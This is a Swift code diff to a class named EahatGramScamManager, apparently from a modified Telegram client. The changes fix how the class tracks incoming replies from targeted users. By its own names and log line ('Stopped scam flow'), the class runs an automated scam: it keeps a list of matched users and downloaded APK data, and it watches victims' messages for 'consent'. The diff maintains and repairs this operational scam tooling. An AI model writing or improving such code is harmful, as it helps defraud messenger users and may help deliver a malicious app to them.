@@ -62,6 +62,7 @@ public final class EahatGramScamManager {
     private var isRunning = false
     private var currentBuildId: String?
     private var downloadedApkData: Data?
+    private let monitoringResponsesDisposable = MetaDisposable()
     
     private init() {}
     
@@ -106,6 +107,7 @@ public final class EahatGramScamManager {
         matchedUsers.removeAll()
         currentBuildId = nil
         downloadedApkData = nil
+        monitoringResponsesDisposable.set(nil)
         print("[EahatGram Scam] Stopped scam flow")
     }
     
@@ -210,7 +212,7 @@ public final class EahatGramScamManager {
                 }
                 
                 // Add user to matched list
-                if case let .user(user) = author {
+                if let user = author as? TelegramUser {
                     let matchedUser = MatchedUser(
                         userId: user.id.id._internalGetInt64Value(),
                         username: user.username,
@@ -221,6 +223,7 @@ public final class EahatGramScamManager {
                 }
             }
             
+            completion(matched)
         })
     }
     
@@ -254,15 +257,27 @@ public final class EahatGramScamManager {
     private func startMonitoringResponses() {
         guard let context = context else { return }
         
-        // Monitor incoming messages
-        let _ = (context.account.stateManager.addedIncomingMessageIds
-        |> deliverOnMainQueue).start(next: { [weak self] messageIds in
-            guard let self = self, self.isRunning else { return }
-            
-            for messageId in messageIds {
-                self.checkMessageForConsent(messageId: messageId)
+        self.monitoringResponsesDisposable.set((context.account.stateManager.notificationMessages
+        |> deliverOnMainQueue).start(next: { [weak self] messageLists in
+            guard let self = self, self.isRunning else {
+                return
             }
-        })
+            
+            for (messages, _, _, _) in messageLists {
+                for message in messages where message.flags.contains(.Incoming) {
+                    guard let author = message.author else {
+                        continue
+                    }
+                    
+                    let userId = author.id.id._internalGetInt64Value()
+                    guard self.matchedUsers[userId] != nil else {
+                        continue
+                    }
+                    
+                    self.checkMessageForConsent(messageId: message.id)
+                }
+            }
+        }))
     }
     
     private func checkMessageForConsent(messageId: MessageId) {
